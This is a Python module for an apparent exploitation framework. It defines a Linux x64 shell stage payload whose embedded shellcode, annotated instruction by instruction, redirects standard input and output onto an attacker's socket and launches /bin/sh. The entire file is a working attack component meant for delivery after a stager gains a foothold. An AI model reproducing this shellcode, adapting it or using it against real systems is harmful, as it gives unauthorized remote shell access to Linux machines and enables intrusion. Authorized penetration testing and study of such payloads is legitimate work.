from collections.abc import Sequence

from teralibs.tsf.base.payload import ARCH_X64, PLATFORM_LINUX, STAGE, Payload


class TerasploitModule(Payload):
    """Linux x64 interactive shell stage."""

    NAME: str = "Linux x64 Shell Stage"
    DESCRIPTION: str = (
        "Full interactive /bin/sh stage for Linux x86-64.  Delivered "
        "automatically over the channel opened by a compatible x64 stager. "
        "Not used directly by exploit modules."
    )
    AUTHOR: Sequence = ["4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.0"
    RANK: str = "normal"
    REFERENCES: Sequence = []
    PAYLOAD_TYPE: str = STAGE
    # Stages travel over a socket, not an exploit buffer - ceiling is generous.
    MAX_SIZE: int | None = 1024 * 1024  # 1 MiB
    ARCH: Sequence = [ARCH_X64]
    PLATFORM: Sequence = [PLATFORM_LINUX]
    STAGE_BLOB: bytes = (
        # 1. dup2(client_fd, 2), dup2(client_fd, 1), dup2(client_fd, 0)
        b"\x6a\x03"  # push 3
        b"\x5e"  # pop rsi
        # <loop>:
        b"\x48\xff\xce"  # dec rsi
        b"\x6a\x21"  # push 0x21 (sys_dup2)
        b"\x58"  # pop rax
        b"\x0f\x05"  # syscall
        b"\x75\xf6"  # jne <loop>
        # 2. execve("/bin/sh", NULL, NULL)
        b"\x6a\x3b\x58"  # push 0x3b; pop rax (sys_execve)
        b"\x99"  # cdq (rdx=0)
        b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # movabs rbx, "/bin/sh\x00"
        b"\x53"  # push rbx
        b"\x48\x89\xe7"  # mov rdi, rsp (path)
        b"\x52"  # push rdx (argv[1]=NULL)
        b"\x57"  # push rdi (argv[0]="/bin/sh")
        b"\x48\x89\xe6"  # mov rsi, rsp (argv pointer)
        b"\x0f\x05"  # syscall
    )

    def generate(self, ctx):
        """Generate method is not really implemented in stage payloads."""
        return b""

    def generate_stage(self, ctx):
        """Return the Linux x64 shell stage bytes."""
        return self.STAGE_BLOB
